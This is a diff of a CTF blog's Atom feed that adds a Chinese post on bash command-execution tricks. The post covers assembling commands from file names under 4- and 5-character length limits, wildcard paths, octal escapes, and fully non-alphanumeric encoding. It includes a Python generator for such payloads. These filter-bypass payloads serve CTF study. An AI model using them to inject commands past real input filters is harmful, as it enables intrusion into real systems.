@@ -4,7 +4,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
     <title type="text">Ajatar</title>
     <subtitle type="html">Ajatar's blog</subtitle>
-    <updated>2020-03-17T16:49:50+08:00</updated>
+    <updated>2020-03-17T17:10:35+08:00</updated>
     <id>https://ajatars.github.io/</id>
     <link rel="alternate" type="text/html" href="https://ajatars.github.io/" />
     <link rel="self" type="application/atom+xml" href="https://ajatars.github.io/atom.xml" />
@@ -16,6 +16,290 @@
             </author>
     <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights>
     <generator uri="https://gohugo.io/" version="0.67.0">Hugo</generator>
+        <entry>
+            <title type="text">各种骚骚的命令执行</title>
+            <link rel="alternate" type="text/html" href="https://ajatars.github.io/posts/%E5%90%84%E7%A7%8D%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" />
+            <id>https://ajatars.github.io/posts/%E5%90%84%E7%A7%8D%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
+            <updated>2020-03-17T17:05:29+08:00</updated>
+            <published>2020-03-16T14:42:58+08:00</published>
+            <author>
+                    <name>Ajatar</name>
+                    <uri>https://Ajatars.github.io</uri>
+                    <email>Ajatars@163.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights>
+    
+    <summary type="html"><![CDATA[1.长度限制的命令执行 1.1 长度限制为5时 思路: 根据 &lsquo;&gt;&rsquo; 运算符创建文件，并利用文件名拼接成……]]></summary>
+            
+                <content type="html"><![CDATA[<h1 id="1长度限制的命令执行">1.长度限制的命令执行</h1>
+<h2 id="11-长度限制为5时">1.1 长度限制为5时</h2>
+<p><strong>思路:</strong><br>
+根据 &lsquo;&gt;&rsquo; 运算符创建文件，并利用文件名拼接成命令,再用sh命令运行<br>
+下面直接放代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">bash</span><span class="p">:</span>
+<span class="o">&gt;</span><span class="n">l</span>\\        <span class="c1">#创建 l文件</span>
+<span class="o">&gt;</span><span class="n">s</span>\ \\      <span class="c1">#创建 s + 空格文件</span>
+<span class="n">ls</span><span class="o">&gt;</span><span class="n">_</span>        <span class="c1">#ls空格 输入到 _ 文件中</span>
+<span class="o">&gt;-</span><span class="n">t</span>\\       <span class="c1">#创建 -t 文件  (ls -t 以创建文件时间排序)</span>
+<span class="o">&gt;</span>\<span class="o">&gt;</span><span class="n">y</span>        <span class="c1">#创建 &gt;y 文件</span>
+<span class="n">ls</span><span class="o">&gt;&gt;</span><span class="n">_</span>       <span class="c1">#追加 -t &gt;y 到 _文件中</span>
+
+<span class="c1">#注意: 直接ls添加不好控，因为ls 排序默认以 非字符，字母，数字来排序。</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>文件名后面添加 &lsquo;\&rsquo; 是为了换行拼接下一个文件名，''\\&rsquo; 为转义得到 &lsquo;'，    真实有命令执行时只需写一个 &lsquo;\&rsquo; ，shell命令行下需要 &lsquo;\\&rsquo;<br>
+<img src="https://i.loli.net/2019/07/12/5d288073c464750346.jpg" alt="1.jpg"></p>
+<p>查看一下创建的文件，没有创建 y <br>
+<img src="https://i.loli.net/2019/07/12/5d288073af09715149.jpg" alt="2.jpg"><br>
+利有<code>sh _</code>运行<br>
+<img src="https://i.loli.net/2019/07/12/5d288073b06cd34099.jpg" alt="3.jpg"><br>
+再查看一下创建的文件<br>
+<img src="https://i.loli.net/2019/07/12/5d288073b0b0328434.jpg" alt="4.jpg"></p>
+<p>接下来执行命令 (<code>curl www.baidu.com</code>)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;</span><span class="n">com</span>
+<span class="o">&gt;</span><span class="n">u</span><span class="o">.</span>\\
+<span class="o">&gt;</span><span class="nb">id</span>\\
+<span class="o">&gt;</span><span class="n">ba</span>\\
+<span class="o">&gt;</span><span class="n">w</span><span class="o">.</span>\\
+<span class="o">&gt;</span><span class="n">ww</span>\\
+<span class="o">&gt;</span><span class="n">l</span>\ \\
+<span class="o">&gt;</span><span class="n">r</span>\\
+<span class="o">&gt;</span><span class="n">cu</span>\\
+<span class="c1">#注意如果是ip 地址 划分文件名时小数点不能单独放于开头创建文件，也可以转换为整数ip</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://i.loli.net/2019/07/12/5d288584a886a43588.jpg" alt="5.jpg"></p>
+<p><code>sh y</code>
+<img src="https://i.loli.net/2019/07/12/5d288584de93423314.jpg" alt="6.jpg"></p>
+<h2 id="12-长度限制为4时">1.2 长度限制为4时</h2>
+<p><strong>思路:</strong><br>
+也是创建文件 根据局限的排序规则利有<code>rev</code>命令反转字符串</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;</span><span class="nb">dir</span>       <span class="c1">#创建dir 文件</span>
+<span class="o">&gt;</span><span class="n">sl</span>        <span class="c1">#创建sl 文件</span>
+<span class="o">&gt;</span><span class="n">g</span>\<span class="o">&gt;</span>       <span class="c1">#创建g&gt; 文件</span>
+<span class="o">&gt;</span><span class="n">ht</span><span class="o">-</span>       <span class="c1">#创建ht- 文件</span>
+<span class="o">*&gt;</span><span class="n">v</span>        <span class="c1">#运行 dir命令 并输入到v</span>
+<span class="o">&gt;</span><span class="n">rev</span>       <span class="c1">#创建rev文件</span>
+<span class="o">*</span><span class="n">v</span><span class="o">&gt;</span><span class="n">x</span>       <span class="c1">#执行 rev命令 并输入到x</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://i.loli.net/2019/07/12/5d28882e148c226249.jpg" alt="1.jpg"><br>
+dir和ls 也是根据默认排序规则进行<br>
+这里 d g h s 正好符合默认排序规则<br>
+<img src="https://i.loli.net/2019/07/12/5d28882dea9d849356.jpg" alt="2.jpg"><br>
+<img src="https://i.loli.net/2019/07/12/5d28882e06ed145228.jpg" alt="3.jpg"></p>
+<p><img src="https://i.loli.net/2019/07/12/5d28882e1fcef45401.jpg" alt="4.jpg"></p>
+<p>执行命令(<code>curl www.baidu.com</code>)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;</span><span class="n">com</span>
+<span class="o">&gt;</span><span class="n">u</span><span class="o">.</span>\\
+<span class="o">&gt;</span><span class="nb">id</span>\\
+<span class="o">&gt;</span><span class="n">ba</span>\\
+<span class="o">&gt;</span><span class="n">w</span><span class="o">.</span>\\
+<span class="o">&gt;</span><span class="n">ww</span>\\
+<span class="o">&gt;</span><span class="n">l</span>\ \\
+<span class="o">&gt;</span><span class="n">r</span>\\
+<span class="o">&gt;</span><span class="n">cu</span>\\
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://i.loli.net/2019/07/12/5d288a20e93a978440.jpg" alt="5.jpg"></p>
+<p>然后执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">sh x
+sh g
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://i.loli.net/2019/07/12/5d288a2126bec36096.jpg" alt="6.jpg"></p>
+<h1 id="2-使用通配符">2. 使用通配符</h1>
+<pre><code>/???/??? [TAB][TAB]
+</code></pre><p><img src="https://i.loli.net/2019/07/12/5d288dccbdda420859.jpg" alt="1.jpg"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">/???/??? /??????
+
+<span class="c1">#/dev/cat 长度为六的文件</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="3使用八进制命令执行">3.使用八进制命令执行</h1>
+<p>154=oct(l),163=oct(s)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="s1">$&#39;\154\163&#39;</span>  <span class="c1">#ls</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://i.loli.net/2019/07/12/5d288f6d2b7f915490.jpg" alt="1.jpg">   <br>
+通过{a,b}语法分割命令和参数</p>
+<pre><code>{$'\154\163',$'\55\154\141'} # ls -a
+</code></pre><p><img src="https://i.loli.net/2019/07/12/5d288f6d4038640961.jpg" alt="2.jpg"></p>
+<h1 id="4-不用数字字母的命令执行">4. 不用数字字母的命令执行</h1>
+<p>前提:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="si">${#}</span>   <span class="o">=</span>&gt; <span class="m">0</span>
+<span class="si">${#</span><span class="p">#</span><span class="si">}</span>  <span class="o">=</span>&gt; <span class="m">1</span>
+<span class="k">$((</span><span class="m">1</span>&lt;&lt;<span class="m">1</span><span class="k">))</span> <span class="o">=</span>&gt; <span class="m">2</span> 
+<span class="k">$((</span><span class="m">2#</span>bbb<span class="k">))</span> <span class="o">=</span>&gt; 將 bbb 从二进制转换
+<span class="si">${</span><span class="p">!#</span><span class="si">}</span> <span class="o">=</span>&gt;  当前script的名称 与<span class="si">${</span><span class="nv">0</span><span class="si">}</span> 相等效果等同于 <span class="nv">$BASH_ARGV</span>（/bin/bash）
+
+
+注意: 运行<span class="si">${</span><span class="p">!#</span><span class="si">}</span>需要进入root权限，否则是一个rbash<span class="o">(</span>restricted bash<span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://i.loli.net/2019/07/12/5d2894d5177bf85833.jpg" alt="1.jpg"><br>
+接下来根据 第三点根据八进制的命令执行一步步来改</p>
+<pre><code>$'\154\163' #ls
+</code></pre><pre><code>#159 163
+$((2#001))$((2#101))$((2#101))$((2#001))$((2#110))$((2#011))
+</code></pre><p><img src="https://i.loli.net/2019/07/12/5d2894d50338e50952.jpg" alt="2.jpg"></p>
+<pre><code>#$'\155\163' 注意里面的\转义用途
+$\'\\$((2#001))$((2#101))$((2#101))\\$((2#001))$((2#110))$((2#011))\'
+</code></pre><p><img src="https://i.loli.net/2019/07/12/5d289593adfc489328.jpg" alt="4.jpg"></p>
+<pre><code>#传递到/bin/bash 并执行
+${!#}&lt;&lt;&lt;$\'\\$((2#001))$((2#101))$((2#100))\\$((2#001))$((2#110))$((2#011))\'
+</code></pre><p><img src="https://i.loli.net/2019/07/12/5d2894d4f04be36567.jpg" alt="3.jpg"></p>
+<p>同八进制代码执行一样 要是带入参数 得使用{a,b}语法分割</p>
+<p>注意有空格时 还要再套一层&rsquo;{}&rsquo; 才是最终传递到<code>${!#}</code>的命令<br>
+否则:</p>
+<p><img src="https://i.loli.net/2019/07/12/5d2897b87270767259.jpg" alt="5.jpg"></p>
+<p>成功的命令执行 <code>curl www.baidu.com</code>
+<img src="https://i.loli.net/2019/07/12/5d2897b883ec814112.jpg" alt="6.jpg"></p>
+<p>借用hexman师傅的脚本</p>
+<pre><code>#注意区分python版本
+n = dict()
+n[0] = '$#'
+n[1] = '${##}'
+n[2] = '$(({n1}&lt;&lt;{n1}))'.format(n1=n[1])
+n[3] = '$(({n2}#{n1}{n1}))'.format(n2=n[2], n1=n[1])
+n[4] = '$(({n1}&lt;&lt;{n2}))'.format(n2=n[2], n1=n[1])
+n[5] = '$(({n2}#{n1}{n0}{n1}))'.format(n2=n[2], n1=n[1], n0=n[0])
+n[6] = '$(({n2}#{n1}{n1}{n0}))'.format(n2=n[2], n1=n[1], n0=n[0])
+n[7] = '$(({n2}#{n1}{n1}{n1}))'.format(n2=n[2], n1=n[1])
+usercommand=&quot;curl www.baidu.com&quot;.split()
+#py3 oct is 0oxxx python2 oct is 0xxx for py2 here is y[1:]
+commandoct=[[y[2:] for y in map(oct,map(ord,x))] for x in usercommand] 
+print (commandoct)
+usercmdarr=[]
+for _ in commandoct:
+    tmp=&quot;&quot;
+    for s in _:
+        tmp+=&quot;\\\\&quot;
+        for i in s:
+            tmp+=n[int(i)]
+    usercmdarr.append(&quot;$\\'{bashencode}\\'&quot;.format(bashencode=tmp))
+bashexec=&quot;${!#}&lt;&lt;&lt;{&quot;+&quot;,&quot;.join(usercmdarr)+&quot;}&quot;
+print(bashexec)
+#${!#}&lt;&lt;&lt;{$\'\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$(($((${##}&lt;&lt;${##}))#${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}$#${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$((${##}&lt;&lt;${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))\',$\'\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}$#))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$((${##}&lt;&lt;${##}))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))${##}\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))${##}\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}$#${##}))\\$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}$#))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$(($((${##}&lt;&lt;${##}))#${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}$#${##}))\'}
+
+</code></pre><h1 id="5参考链接">5.参考链接</h1>
+<p><a href="https://www.hexlt.org/archives/116/?tdsourcetag=s_pcqq_aiomsg">https://www.hexlt.org/archives/116/?tdsourcetag=s_pcqq_aiomsg</a><br>
+<a href="https://www.xuebuyuan.com/2181778.html">https://www.xuebuyuan.com/2181778.html</a><br>
+<a href="https://www.cnblogs.com/flintlovesam/p/6677037.html">https://www.cnblogs.com/flintlovesam/p/6677037.html</a><br>
+<a href="http://www.bendawang.site/2017/11/15/Hitcon2017-Web-Writeup/">http://www.bendawang.site/2017/11/15/Hitcon2017-Web-Writeup/</a></p>
+]]></content>
+            
+            
+            
+            
+            
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://ajatars.github.io/categories/ctf/" term="CTF" label="CTF" />
+                            
+                        
+                    
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://ajatars.github.io/tags/ctf/" term="CTF" label="CTF" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
         <entry>
             <title type="text">CTF Crypto</title>
             <link rel="alternate" type="text/html" href="https://ajatars.github.io/posts/ctf-crypto/" />
@@ -74,8 +358,8 @@
             <title type="text">CTF Web 备忘录（续更）</title>
             <link rel="alternate" type="text/html" href="https://ajatars.github.io/posts/ctf-web/" />
             <id>https://ajatars.github.io/posts/ctf-web/</id>
-            <updated>2020-03-17T16:49:42+08:00</updated>
-            <published>2020-03-15T14:42:58+08:00</published>
+            <updated>2020-03-17T17:10:10+08:00</updated>
+            <published>1969-01-01T14:42:58+08:00</published>
             <author>
                     <name>Ajatar</name>
                     <uri>https://Ajatars.github.io</uri>
@@ -136,6 +420,13 @@
 <li><a href="#61-fuzz%E6%80%9D%E8%B7%AF">6.1 fuzz思路</a></li>
 <li><a href="#62-htaccess%E5%92%8Cuserini">6.2 htaccess和.user.ini</a></li>
 <li><a href="#63-php%E5%86%99%E6%96%87%E4%BB%B6">6.3 php/.写文件</a></li>
+</ul>
+</li>
+<li><a href="#7%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">7.命令执行</a>
+<ul>
+<li><a href="#71-bash%E4%B8%8B%E7%9A%84%E4%B8%80%E4%BA%9Btrick">7.1bash下的一些trick</a></li>
+<li><a href="#72-%E5%B7%A7%E7%94%A8curl">7.2 巧用curl</a></li>
+<li></li>
 </ul>
 </li>
 </ul>
@@ -719,7 +1010,11 @@ magic_quotes_gpc 关闭
 <pre class="chroma"><code class="language-php" data-lang="php">copy()、file_get_contents()、move_uploaded_file()
 </code></pre></td></tr></table>
 </div>
-</div>]]></content>
+</div><hr>
+<h2 id="7命令执行">7.命令执行</h2>
+<h4 id="71-bash下的trick">7.1 bash下的trick</h4>
+<p><a href="">放下菜鸡的文章</a></p>
+]]></content>
             
             
             
